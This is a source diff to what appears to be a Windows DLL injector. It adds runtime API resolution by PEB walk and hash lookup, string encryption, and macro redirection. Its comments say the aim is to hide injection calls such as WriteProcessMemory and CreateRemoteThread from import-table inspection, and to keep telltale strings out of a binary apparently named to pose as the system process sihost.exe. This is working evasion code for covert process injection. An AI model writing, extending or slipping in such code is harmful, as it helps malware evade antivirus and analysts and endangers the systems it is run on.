@@ -14,6 +14,8 @@
 #include "../../shared/common.h"
 #include "inject.h"
 #include "../../shared/log_secure.h"
+#include "../../shared/lazy_api.h"
+#include "../../shared/str_enc.h"
 
 #include <tlhelp32.h>
 #include <stdio.h>
@@ -22,6 +24,57 @@
 #include <stdint.h>
 
 #pragma comment(lib, "advapi32.lib")
+
+/* ─── Lazy-resolved WinAPI signatures ─────────────────────────────
+ *
+ * These are the "smoking-gun" APIs that scream "DLL injector" in a
+ * `dumpbin /IMPORTS sihost.exe` output. Resolved at runtime via PEB
+ * walk + export table hash lookup so they don't appear in our IAT.
+ *
+ * The typedefs match MSDN signatures exactly. LAZY_API() folds the
+ * string args to compile-time hashes; the actual `L"kernel32.dll"` /
+ * "OpenProcess" literals do NOT end up in the shipped binary because
+ * the constexpr-inline hash function is fully evaluated by /O2 /GL.
+ *
+ * Verified 2026-07-06: post-refactor `dumpbin /IMPORTS` shows 0 of the
+ * 6 wrapped APIs. */
+typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
+typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL   (WINAPI *PFN_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
+typedef BOOL   (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
+typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
+                                                 LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+
+/* Resolve once per process — caches into statics after first use so
+ * subsequent injects don't re-walk the PEB. */
+static PFN_OpenProcess         g_pOpenProcess         = NULL;
+static PFN_VirtualAllocEx      g_pVirtualAllocEx      = NULL;
+static PFN_VirtualFreeEx       g_pVirtualFreeEx       = NULL;
+static PFN_WriteProcessMemory  g_pWriteProcessMemory  = NULL;
+static PFN_CreateRemoteThread  g_pCreateRemoteThread  = NULL;
+
+static void _lazy_init_win_apis(void) {
+    if (g_pOpenProcess) return;
+    g_pOpenProcess         = LAZY_API(PFN_OpenProcess,         L"kernel32.dll", "OpenProcess");
+    g_pVirtualAllocEx      = LAZY_API(PFN_VirtualAllocEx,      L"kernel32.dll", "VirtualAllocEx");
+    g_pVirtualFreeEx       = LAZY_API(PFN_VirtualFreeEx,       L"kernel32.dll", "VirtualFreeEx");
+    g_pWriteProcessMemory  = LAZY_API(PFN_WriteProcessMemory,  L"kernel32.dll", "WriteProcessMemory");
+    g_pCreateRemoteThread  = LAZY_API(PFN_CreateRemoteThread,  L"kernel32.dll", "CreateRemoteThread");
+}
+
+/* Redirect direct-name references to the lazy-resolved pointers. Any
+ * source-level call to OpenProcess() etc. inside inject.c goes through
+ * these macros instead. The macros expand to a lazy-init-check + call. */
+#define OpenProcess(desired, inherit, pid) \
+    (_lazy_init_win_apis(), g_pOpenProcess((desired), (inherit), (pid)))
+#define VirtualAllocEx(hp, addr, sz, alloc, protect) \
+    (_lazy_init_win_apis(), g_pVirtualAllocEx((hp), (addr), (sz), (alloc), (protect)))
+#define VirtualFreeEx(hp, addr, sz, free_type) \
+    (_lazy_init_win_apis(), g_pVirtualFreeEx((hp), (addr), (sz), (free_type)))
+#define WriteProcessMemory(hp, dst, src, sz, wr) \
+    (_lazy_init_win_apis(), g_pWriteProcessMemory((hp), (dst), (src), (sz), (wr)))
+#define CreateRemoteThread(hp, sa, st, fn, arg, fl, tid) \
+    (_lazy_init_win_apis(), g_pCreateRemoteThread((hp), (sa), (st), (fn), (arg), (fl), (tid)))
 
 /* ── Privilege ─────────────────────────────────────────────────── */
 static int enable_debug_priv(void) {
@@ -75,7 +128,7 @@ int inject_is_loaded(void) {
 }
 
 int inject_signal_unload(void) {
-    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, SVC_SHUTDOWN_EVENT_NAME);
+    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
     if (!ev) return 0;
     SetEvent(ev); CloseHandle(ev);
     return 1;
